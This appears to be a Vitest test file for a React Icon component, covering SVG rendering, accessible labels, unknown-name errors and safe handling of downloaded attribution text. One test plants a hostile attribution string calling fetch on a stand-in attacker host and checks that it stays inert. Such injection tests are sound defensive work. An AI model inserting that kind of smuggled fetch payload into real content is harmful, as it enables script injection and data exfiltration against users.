import { cleanup, render, screen } from '@testing-library/react';
import { afterEach, describe, expect, it, vi } from 'vitest';
import { Icon } from '@/components/ui/Icon';
import { generatedIcons } from '@/icons/generated';
import type { IconName } from '@/icons/manifest';

describe('Icon', () => {
  afterEach(() => {
    cleanup();
    vi.unstubAllGlobals();
  });

  it('renders a manifest icon as an SVG that inherits currentColor', () => {
    render(<Icon name="package" className="package-icon" data-testid="package-icon" />);

    const icon = screen.getByTestId('package-icon');
    expect(icon.tagName.toLowerCase()).toBe('svg');
    expect(icon).toHaveClass('package-icon');
    expect(icon).toHaveAttribute('aria-hidden', 'true');
    expect(icon.querySelector('[fill="currentColor"]')).not.toBeNull();
    expect(icon.innerHTML).not.toMatch(/#8fbffa|#2859c5/i);
  });

  it('uses the optional accessible label', () => {
    render(<Icon name="leakTrace" label="Leak trace" />);

    expect(screen.getByRole('img', { name: 'Leak trace' })).not.toHaveAttribute('aria-hidden');
  });

  it('renders downloaded attribution as inert SVG description text', () => {
    const originalIcon = generatedIcons.copy;
    const hostileAttribution = "Streamline {fetch('https://attacker.invalid')}";
    const fetchSpy = vi.fn();
    vi.stubGlobal('fetch', fetchSpy);
    generatedIcons.copy = {
      attribution: hostileAttribution,
      paths: [{ d: 'M0 0h7v7H0z' }],
      viewBox: '0 0 14 14',
    };

    try {
      render(<Icon name="copy" data-testid="hostile-attribution-icon" />);

      expect(
        screen.getByTestId('hostile-attribution-icon').querySelector('desc')
      ).toHaveTextContent(hostileAttribution);
      expect(fetchSpy).not.toHaveBeenCalled();
    } finally {
      generatedIcons.copy = originalIcon;
    }
  });

  it('throws instead of silently rendering an unknown icon', () => {
    expect(() => render(<Icon name={'not-in-the-manifest' as IconName} />)).toThrow(
      'Unknown icon name: not-in-the-manifest'
    );
  });
});
